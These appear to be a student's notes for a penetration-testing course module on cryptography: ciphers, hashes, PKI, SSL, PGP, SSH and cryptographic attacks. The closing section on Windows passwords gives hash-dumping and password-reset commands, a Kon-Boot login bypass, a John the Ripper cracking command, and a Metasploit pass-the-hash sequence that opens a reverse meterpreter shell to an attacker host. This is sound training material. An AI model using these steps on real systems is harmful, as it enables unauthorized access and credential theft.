# [ECPPT](https://members.elearnsecurity.com/courses/penetration_testing_professional_v5)
__________________________
# System Security
# Module 5 - Cryptography

https://cdn.members.elearnsecurity.com/ptp_v5/section_1/module_5/html/index.html

_______________________________________
## 1. Classification
Classification of algorithms:
1. **Based on Cryptography**
  - **Symmetric Cryptography (DES/3DES, AES. RC4, Blowfish, Caesar's, etc.)** <br>
    Both sender and receiver share the same key

  - **Public-Key / Asymmetric Cryptography**<br>
    Sender and receiver uses different keys, public-key (for encrypting) and private-key (for decrypting).

    When a message is encrypted using Bob's public key, only Bob's private key will be able to decrypt the message.

    Public and private key are [mathematically derived](https://www.di-mgt.com.au/rsa_alg.html) from prime number's however private key cannot be derived from public key. It is based on the factorization mathematical problem (harder to find a factor of something than to create a number by multiplying its factors).

2. **Based on How Plaintext in Handled**
  - **Block Cipher (DES, AES, etc.)** <br>
    Data is handled in blocks (say chunks of 8 bytes)

    Simple block ciphers can be used din a number of modes, we will explain 2 very basis modes:
    - **ECB** (Electronic Code Book)<br>
      In this mode, the message is divided into blocks and each block is encrypted separately.

      This makes ciphertext analysis much easier because identical plaintext blocks are encrypted into identical ciphertext blocks.

      This mode is deprecated

    - **CBC** (Cipher Block Chaining) <br>
      In this mode, each ciphertext block is derived from the previous block as well. An initialization vector is used for the first block.

  - **Stream Cipher (RC4, A5/1, etc.)** <br>
    Data is handled 1 byte at a time

________________________________________
## 2. Cryptography Hash Function
A cryptographic hash function is a deterministic algorithm that produces a fixed length block of bits from a variable length input message. The output is usually called has or digest. The most famous hash function is MD5, MD4, SHA1, and SHA2.

Properties of hash functions:
- Preimage resistance <br>
It should be infeasible to find a message that has a given hash
- Second preimage resistance <br>
Given an input message, it should be infeasible to find another message with the same hash
- Collision resistance <br>
It should be infeasible to find two different messages with the same hash

Almost all cryptographic hashes and ciphers have what is called an Avalanche effect. This means that a single bit changed in that message will cause a vast change in the final input.
_______________________________________
## 3. Public Key Infrastructure
The Public Key Infrastructure (PKI) is a set of hardware, software, people, policies, and procedures needed to create, manage, store, distribute, and revoke digital certificates.

In cryptography, PKI relies upon a number of elements to make sure that the identity of an individual or an organization is effectively certifies and verified by means of a certificate authority (CA). The identity of each CA must be unique.

The term PKI sometimes erroneously used to denote public key algorithms, which do not require the use of CA.

#### 3.1. **X.509**
**X.509** is the standard for public key certificates and widely used in protocols like SSL/TLS, SET, S/MIME, IPsec, and more.

#### 3.2. **Public Key Certificate**
A certificate bind a public key with an identity by means of digital signature.

The identity information includes the name of a person or an organization, their address, and so forth.

The certificate can be used to verify that a public key belongs to a individual.

In a PKI scheme, the signature assuring the identity will be of a certification authority (CA).

The CA acts as a trusted third party.

If someone wants to verify the identity of another organization, they have to trust the CA first.

The signatures on a certificate are attestations by the certificate signer that the identity information and the public key are bound together.

**For example:**<br>
CA signs Bob's Public Key certifying that the key actually belong to Bob.
This ensures that any communication is encrypted with Bob's public key and can be read by Bob only.

CA signature signs the couple: <*BOB, BOBkey*> binding that key to Bob.

The same approach is taken with SSL certificates.

An SSL certificate has 2 purposes:
1. Provide proof of identity
2. Provide a secure channel for transmitting data

A chain exist: [Reference](http://www.win.tue.nl/hashclash/rogue-ca/)<br>
**Root CA's sign certificates of intermediate CA's that sign SSL certificates of websites**

Someone who forges Root CA's signatures can sign every other certificates; having it being validated successfully by web browsers.

The visitor of a website using SSL is presented with a certificate signed by a CA. He can validate the validity of the SSL certificate by validating its signature.

To validate a signature, the Public key of the signer is required: This is located in the web browser.

**Web browsers store public keys of root CA's**

How does SSL achieves authenticity and confidentiality?

Authenticity is verified by verifying the validity of the certificate (validating the digital signature)

Confidentiality is achieved by handshaking initial channel parameters encrypted with the SSL certificate public key of the website.

Content's of typical Digital Certificate:
- Serial number
- Subject
- Signature Algorithm
- Issuer
- Valid-Form
- Valid-To
- Public Key
- Thumbprint Algorithm
- Thumbprint

Common filename extensions for X.509-certificates are:
- **.DER** : DER encoded certificate
- **.PEM** : (Privacy Enhanced Email) Base64 encoded DER certificate, enclosed between "-----BEGIN CERTIFICATE-----" and "-----END CERTIFICATE-----")
- **.P7C** : PKCS#7 SignedData structure without data, just certificate(s) or CRL(s) (Certificate Revocation List)
- **.PFX** or .P12 : PKCS#12, may contain certificate(s) (public) and private keys (password protected)

#### 3.3. SSL (Secure Socket Layer)
SSL uses both PKI and Symmetric encryption to create secure communication channels between two entities

SSL also ensure that no thirds party can tamper or alter the communication without the two entities to be aware of that.

SSL also ensures that no third party can tamper or alter the communication without the two entities to be aware of that.

|Client|  ------------------   |Server|
|------|-----------------------|------|
|------| Client Hello, list of algorithms that client can use |----->|
|<-----| Server hello, choose these algorithms, and this is my certificate                    |------|
|<-----| Optional: send me your certificate                    |------|
|------| Optional: Send certificate                    |----->|
|<-----| Key Exchange (Random number and PreMasterSecret are used to compute a common secret)       |----->|
|<-----| Change ChiperSpec (Both authenticate the whole communications until now)                     |----->|
|<-----| HANDSHAKE COMPLETE    |----->|

#### 3.4. Digital Signature
Digital signature is a mechanism that allows to authenticate a message. It proves that the message is effectively coming from a given sender.

The signature on a document cannot be reproduced for other documents; it is strictly bound to be signed document or a representation of it.

Suppose Alice wants to sign a document and Bob wants to verify it.

Alice:<br>
**Input message -> Hash value + Private Key -> Digital Signature**

Bob:<br>
**Signed message -> Hash value**
**<--Compare-->**
**Original hash-value <- Digital Signature + Public Key**

The main reasons for producing a message digest are:
- The message integrity is preserved. Any message alteration will be detected
- The digital signature is applied to  the digest. This is because it is smaller than the message
- Hashing algorithms are much faster than any encryption algorithm


_______________________________________
## 4. Pretty Good Privacy (PGP)
Pretty Good Privacy is a computer program that provides cryptographic privacy and authentication created by Phillip Zimmermann in 1991. PGP is a windows tools commonly used to encrypt files, apply digital signature and enforce integrity. PGP and other similar products follow the OpenPGP standard for encrypting and decrypting data.

PGP encryption uses public key cryptography and includes a system which binds the public keys. Web of trust has made PGP widespread because easy, fast and inexpensive to use. Web of trust differs from trust chain. While trust chain is hierarchical, the web of trust looks like a web.

PGP supports message authentication an d integrity check. The model works as long as we are sure that the public key used to send the message belongs effectively to the intended addressee. We have to put trust in that binding because there's no CA confirming that.

**OpenPGP** is a set of standards which describes the formats for encrypted messages, keys, and digital signatures. GnuPG (PGP) is an open-source GPL implementation of the standards, and is the usual implementation found on GNU/Linux systems. Most of what you read about PGP applies also to GnuPG.

A PGPkey has several parts:
1. **Name** of its owner
2. **Numerical** value(s) comprising the key
3. **What the is to be used for** (e.g. signing, encryption)
4. **The algorithm** the key is to be used with (e.g. ElGamal, DSA, RSA)
5. **An expiration** date (possibly)

Those fields are similar to those of an X.509 certificate. But a PGP key is not a certificate (no-one has signed it yet).

When using PGP, you will need to store:
- **Your own secret key** (this will be stored encrypted with a passphrase)
- **You own public key** and the public keys of your friends and associates (stored in clear)

The PGP software puts them in a file, called your keyring. Your private keys are in a file and stored encrypted with a passphrase. The public key don't have to be protected. The keyring also contains copies of other people's public keys which are trusted by you.

PGP can digitally sign a document, or actually a digest (e.g. SHA1) version of the document.

This is because:
- It is more efficient; it only has to sign 160 bits instead of your while message, for remember that PK crypto is expensive
- It means that the signature is a manageable length (160 bits can be represented easily in HEX)

If you want to encrypt a message, PGP will first generate a symmetric key and then encrypt the symmetric key with the public key. The actual message is then encrypted with the symmetric key. This is much more efficient and allows to have many addresses for the same message by encrypting different symmetric keys with the addresses public keys.

Thus, PGP puts together the ideas of the symmetric-key encryption, public-key encryption, and hash functions, and also text compression, in a practical and usable way to enable you to sign and/or encrypt email.

The algorithms PGP uses are:
- **RSA, DSS, Diffie-Hellman** for public-key encryption
- **3DES, IDEA, CAST-128** for symmetric-key encryption
- **SHA-1** for hashing
- **ZIP** for compression

_______________________________________
## 5. Secure Shell (SSH)
Secure Shell or SSH is a network protocol that allows data to be exchanged using a secure channel between two networked devices.

Very common on Unix based systems, it is used as a secure replacement for Telnet as it allows remote access to a computer through a secure shell.

A client connecting to a SSH server, will have shell access on the server, in a secure way.

SSH, by means of Public keys can enforce authentication for both client and server.

Moreover it is also used to create tunnels, ports forwarding and secure file transfer.

An SSH server, by default, listens on **TCP port 22**.

SSH allows one to tunnel any protocol within a secure channel. You can do so for instant messaging protocols, mount remote hard drives and so on.

To create an SSH tunnel, an SSH client is configured to forward a specified local port to a port on the remote machine.

Traffic to local port (SSH client) is forwarded to the remote host (SSH client). The remote host will then forward this traffic to the intended target host.

The traffic between SSH client and server will be encrypted.

SSH tunnels provide a means to bypass firewalls that prohibit certain internet services provided that outgoing connections are allowed.

Corporate policies and filters can be bypassed by using SSH traffic.

**Scenario:**
Imagine being in a hotel  or being connected to internet through an open insecure wireless connection.

You can establish a secure connection to your home PC with a simple command.

With this command, all the traffic sent to localhost's port 3000 will be forwarded to remote host on port 23 through the tunnel

```
ssh -L 3000:homepc:23 Bob@sshserver.com
```

Description:
- `-L` is used to initiate a tunnel
- `3000:homepc:23` is `localport:remotehost:remoteport`
- `bob@sshserver` is `username@sshserver`

You can also use telnet to connect to your home PC safely:
```
telnet localhost:3000
```
It will automatically routed to your home PC through the SSH tunnel

_______________________________________
## 6. Cryptographic Attack
Cryptographic attacks are attempts to subvert the security of the crypto algorithms by exploiting weaknesses with the goal to decipher the ciphertext without knowing the key.

Classification of cryptographic attacks depends on the type of data available:
1. **Known only attack**
  - **Known plaintext only attack** <br>
    A cryptanalyst has access to a plaintext and the corresponding ciphertext
  - **Known ciphertext only attack** <br>
    The attacker only knows the ciphertext but no plaintext
2. **Chosen attack**
  - **Chosen plaintext attack** <br>
    It is similar to 1 but the plaintext can be attacker's choosing
  - **Chosen ciphertext attack** <br>
    This method is used when the attacker only knows the ciphertext of his choosing and works his way back towards the plaintext. This method is very commonly used against public-private key encryption because the public key is widely known and finding private key will defeat the cipher
3. **Adaptive chosen attack**<br>
  In both methods, attacker can choose plaintext or ciphertext respectively one block after the other (based on previous results) which leads to the defeat of the cipher.
  - **Adaptive chosen plaintext attack** <br>
  - **Adaptive chosen ciphertext attack** <br>

#### 6.1. Brute Force Attacks
A brute force attack attempts every combination of the key. It is most often used in a known plaintext or ciphertext-only attack when the attacker can esaily verify the correctness of the guess.

Encryption algorithm like DES that use a key length of 56 bits is now considered absolutely insecure as software that exploit FPGA's and CUDA computational power are available and can break keys in a resonable time.

#### 6.2. Dictionary Attacks
A dicitonary attack attempts the most likely keys. Expecially for the symmetric key algorithms where keys are selected by users, this approach can work better than Brute force attack.

#### 6.3. Rainbow Tables
A rainbow table makes use of the available storage to compute (and store) plaintext-ciphertext correspondences ahead of time.

Pre-computation is indeed the technique used with rainbow table.

The important thing about rainbow table is the **reduction function**, that maps hashes to plaintexts. It is not an inverse function, but a reverse function, since the purpose of hash function is that inverse function cannot be made.

**Example:**
We have our plaintext that is [**14sd5**], and the hashing function generate this hash:
[**c80e626c993af50dc505209bb13adf2**]

the reduction function could be something that takes the first 5 characters from the hash, to create a new plaintext to hash ([**c80e6**])

This is what is called a [chain](http://kestas.kuliukas.com/RainbowTables/).

[Free rainbow tables](http://ophcrack.sourceforge.net/tables.php)

[Generator tool](http://project-rainbowcrack.com/index.htm#download)


#### 6.4. Side Channel Attacks
Side channel attacks don't rely just on plaintext/ciphertext information to attack crypto algorithms.

They also take into account physical implementation including the hardware used to encrypt or decrypt data.

Time taken to perform an encryption, CPU cycles used, and even absorbed power variations during the algorithm can produce important information to a crypto analyst.

Many practical side channel attacks have been discovered. Some of them have been used in attack such as finding the GSM v1 SIM card encryption key. The attack was based on time taken to encrypt the data which slowly leads to build up the keys of the key.

**The birthday attack** is the attack that can discover collisions in hashing algorithms. It is based on birthday paradox, which states that if there are 23 people in the room, the odds are slightly greater than 50% that two will share the same birthday.

The key to understanding the attack is remembering that it is the odds of any 2 people (out of 23) sharing a birthday, and it is not the odds of sharing a birthday with a specific person.

In a room with 23 people there are 22 chances and one candidate. Let's call the candidate Tom. If Tom doesn't have the birthday date matching the one of the 22, leaves the room.

So now there are 21 people plus another candidate, let's call him Chris. If he fails to match with the 21 he leaves and so on.

22 pairs, plus 21 pairs, plus 20 ... plus 1 pair equals 253 pairs. Each pair has a 1/365 chance of having a matching birthday, and the odds of a match cross 50% at 253 pairs.

The birthday attack is most often used to attempt discover collisions in hash functions, such as MD5 or SHA1.

_______________________________________
## 7. Security Pitfalls
Most of the times, an attacker will not directly attack the cryptographic algorithms and instead attack the implementation. A system made of many secure inner blocks is not automatically a secure system.

#### 7.1. Attack against Implementation
Implementation of cryptographic systems correctly is another difficult goal which is hard to achieve.

Some basic point-outs are:
- Not destroying plaintext after use
- Not dealing with decrypted data carefully.
  A system using temporary files to avoid data loss, might leave plaintext or decrypted data or both in the temporary files
- System using more than 1 key, should take care of all keys equally, because a single key leak renders the complete system useless
- Allowing recovery of old keys can also act as a weak point
- And so on

#### 7.2. Attack against Passwords
Attacks against passwords are very common. Many systems break because they rely on user-generated passwords.

People don't choose strong passwords, it is a fact that software architect should deal with.

If they're forced to use strong passwords, users can't remember them or just write them on a file in cleartext.

Dictionary attacks indeed work really well when dictionary is targeted to the environment, country, age, and language of the target.

Software sometimes makes the problem even worse: limiting the password length, converting everything to lower case, etc.

#### 7.3. Attack against Trust Models
Sometimes attackers do not attack their target directly. They can instead exploit trust-systems or roles that the target assumes to be trusted.

Simple systems use simple trust models because more secure trust models might break usability.

Complex systems, like ecommerce instead employ more complex trust models (like signed certificates).

An email program might use secure crypto algorithms to encrypt messages, but unless the public keys are certifies by a trusted source (and unless that certification can be verified), the system is still vulnerable.

Cryptographic algorithm that rely on the security of the other network protocols make an assumption: that these protocols are secure.

Attacking network protocols to break a system that uses an unbreakable cryptography algorithm is what happens everyday on the internet.

#### 7.4. Attack on the Users
Users can be attacked through social engineering, keylogging, or using a malware.

_______________________________________
## 8. Windows 2000/XP/2k3/Vista/7/8 Passwords
```
      Windows Password
             v
    Where are the hashes    |---------> What to do with hashes
             v              |            ---------|---------
      Stealing the hash     |            v                 v
        -----|-----         |      Pass the hash     Crack the hash
        v         v         |                      ---------|---------
      Local     Remote -----|                      v                 v
   -----|-----              |                   CPU Crack        GPU Crack
   v         v              |
Running   Offline           |
system    System            |
   |         |              |         
   -------------------------|
```

All the passwords in Windows (except in Domain Controller configuration) are stored in a configuration database called SAM.

The Security Accounts Manager (SAM) is a database stored as a registry file in Windows NT, Windows 2000, and later versions on Windows.

It stores user's passwords in a hashed format:
- **LM** hash
- **NT** hash

#### 8.1. LM hash or LAN Manager hash
Until Windows Vista, if passwords were smaller than 15 characters, they were stored as LM hash.

Let's see how these LM hashed are created starting from a user's password.

**Computing LM hash from a user password:**
1. The user's password is converted to uppercase
2. If the length is less than 14 bytes it is null-padded, otherwise truncated. E.g.: MYPASSWORD0000
3. It is split into two 7-bytes halves:
`MYPASSW` and `ORD0000`
4. This values are used to create two DES keys, one from each 7-byte half, by converting the seven bytes into a bit stream, and inserting a parity bit after every 7 bits. This generates the 64 bits needed for the DES key.
5. Each of these keys is used to DES-encrypt the constant ASCII string `KGS!@#$%`, resulting in two 8-byte ciphertext values.
6. The 2 ciphertext values are concatenated to form a 16-byte value, which is the LM hash.


All passwords from Windows 2000 are (also) stored as NT hashes.

The trust is that LM hashes are still computed and stored by default up to Windows Vista, for backward compatibility.

In this algorithm, Unicode version of the password is hashed using MD4 algorithm to get resulting hash which is stored for later use.

#### 8.2. Where is the hashes?
These hashed are stored in **Windows SAM file** which is located in `C:\Windows\System32\config`

These values are also stored in the registry at `HKEY_LOCAL_MACHINE\SAM`

But this are of registry is not accessible while the operating system is running and requires SYSTEM privileges.

#### 8.3. Stealing the hash


###### 8.3.1. Stealing the hash - Remote
In this case, passwords are dumped from the memory of remote system, by loading the password dumping program from remote.

**This requires at least an administrative account.**

This can be done using tools such as:
- [pwdump](http://www.foofus.net/fizzgig/pwdump/)
- [fgdump](http://foofus.net/goons/fizzgig/fgdump/)
- [ophcrack](http://ophcrack.sourceforge.net/)
- Metasploit

Let us focus using Metasploit to dump hashes.

Let us assume that we have gained access to victim machine by means of a remote exploit and that we have a **meterpreter shell** (how to do so later)

We can dump the hashes by entering `run hashdump`

###### 8.3.2. Stealing the hash - Local
Here, you need the physical access to the machine. At this point, there are 2 cases:
- **Running System** <br>
  In this case, a **local administrator account is required** to download hashes from the memory
- **Offline System** <br>
  In this, passwords hashes are decrypted from the online password storage file SAM. The key to decrypt SAM is stored in SYSTEM file

There are situations in which you cannot just reboot or turn off the victim machine. Maybe because you want to be stealthy or maybe because the machine have another security measures at start-up. The only thing you need to know is that if you want to steal hashes from a running system, you must have at least Administrator privileges

There are many tools that can help you dump hashes from a live system if you have correct privileges.

Downloads:
- [pwdump]( http://www.foofus.net/~fizzgig/pwdump/) or [pwdump]( http://www.tarasco.org/security/pwdump_7/)
- [fgdump](http://www.foofus.net/~fizzgig/fgdump/default.htm)
- [SAMinside](http://insidepro.com/eng/saminside.shtml)
- [ophcrack](http://ophcrack.sourceforge.net/)
- [IOphtCrack](http://www.l0phtcrack.com/)

#### 8.6 Offline Systems
If you have physical access to the off-line machine, you have a few more options than if you had only the live system.

You can still **steal hashes** (using previous tools) but, in this situation, you can also **overwrite hashes** or even **bypass Windows login**.

###### 8.6.1 Stealing hashes
Tools to help steal hashes from online systems:
- **BackTrack5**
Steps:
1. Boot it
2. Mount Windows and move to folder `/mnt/sda1/WINDOWS/system32/config`
3. run `bkhive system syskey.txt` or ` samdump2 system syskey.txt > ourhashdump.txt` (for Windows 7, run `bkhive SYSTEM syskey.txt`)

- **OphCrack**
As soon as the CD is run on boot OphCrack will immediately retrieve password hashes and prompt them for you. Depending on the live CD you have downloaded, you will also be able to start cracking hashes from there. (Usually not a useful option for a pentester that wants to do cracking later)

Remember that if you boot any other operating system, you can always copy files like SAM, SYSTEM, and then later, load them into one of the tools we have seen so far.

So you can quickly dump the SAM file on a USB dongle and then use OphCrack or john later.


###### 8.6.2. Overwrite hashes
Instead of stealing hashed, you can also use tools to change the SAM file content. One of these is **chntpw** (as well as BT5) includes it. You can simply boot it and run it.

Chntpw allows you to:
- Clear passwords
- Change passwords
- Promote Users to Administrator

**Steps:**
1. Load SAM in chntpw
2. Choose to edit data and which user to change
3. Clear the password
4. Quit and write hive files


###### 8.6.3. Bypass Windos Login
Another method is to bypass Windows login. **Kon-Boot** is a software to get access to a machine by bypassing Windows login.

Kon-Boot is a software which allows to change contents of a Linux and Windows kernel on the fly (while booting).

It allows to log into a system as 'root' user without typing the correct password or to elevate privileges from current user to root. It allows to enter any password protected profile without any knowledge of the password.

[Download](http://www.piotrbania.com/all/kon-boot/)

#### 8.7. What to do with hashes?
There are 2 things we can do with hashes:
- Pass the hash
- Crack the hash

###### 8.7.1. Pass the hash
Pass-the-hash is a different kind of authentication attack that allows us to use LM & NT hashes to gain access to remote Windows host without having to know the actual password: we will only use the hash.

You will see more of this in Network Security section.

For now, let's just give it a look by using Metasploit.

Let's suppose you get the hash for user **eLS** on **Box A** and you know that user eLS also have access to box B. You can run payloads on Box B even if Box B is immune from any exploit.

Steps:
1. Let us configure the module in Metasploit:
```
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
msf exploit(psexec) > set LHOST 192.168.88.132
msf exploit(psexec) > set LPORT 443
msf exploit(psexec) > set RHOST 192.168.88.134
```

Where:
- In the first line we select the exploit module
- Then the payload to run on the remote system (this will allow us to gain a meterpreter shell)
- LHOST is our host (local)
- LPORT is our port
- RHOST is remote victim host

2. After that we can set the user (that will be **eLS**) and the password, where we will insert the hash.
```
msf exploit(psexec) > set SMBUser eLS
msf exploit(psexec) > set SMBPass 00000000000000000000000000000000:0446385C4CBFBAED9F33E1D7B00E184C
msf exploit(psexec) > exploit

```

Note that if you do not have both LM and NT hashes, you can set one of them with 32 0's.

Note that this is just a quick look on how to perform a pass-the-hash using Metasploit framework.

##### 8.7.2 Crack the hash
Fist, we need the hash of the password that we have gained through the previous techniques.

Then we will use the correct hash function to hash plaintexts of likely passwords.

When you get a match, whatever string you used to generate your hash, that's the password you are looking for.

Since this can be rather time-consuming, there are many ways to do hat, and many tools that automate this step.

Remember that the time required to crack a hash is strictly depending on the hardware you have.

A hash can be cracked using a CPU or a GPU.

- **CPU - JtR**
One the most famous password crackers is [John the Ripper](http://www.openwall.com/john/).

With this great tool you can perform different attacks, like dictionary and brute force.

So, let us see now how to crack one the hashes that we dumped in the previous slides.

First of all we need a txt file with the hashes. For LM and NT hashes the file must be in this format:
`eLS:0446385C4CBFBAED9F33E1D7B00E184C`

Where the first entry (`eLS`) is username and second entry is the hash. Once we have our txt file, we can run John with brute force option.

To do this, we write the command:
`john-386.exe --incremental hashtocrack.txt`

The output is **mystrongpsw**

Another tool you can use is **OphCrack**. OphCrack can also use rainbow tables. To get it to work, first download the tables, then load password hashes and tables hashes.

Once you have it all set, click on 'Crack' button and wait for the password.

- **GPU**
A real useful tool that uses GPU to crack hashes is [oclHashcat](https://hashcat.net/oclhashcat/)

Another tool you can use is [RainbowCrack](http://project-rainbowcrack.com/). This tools allows you to use rainbow tables to crack hashes, but using GPU instead of CPU. The problem in there is that rainbow tables are not free, but if you want to calculate them, you can do it with **rtgen.exe**
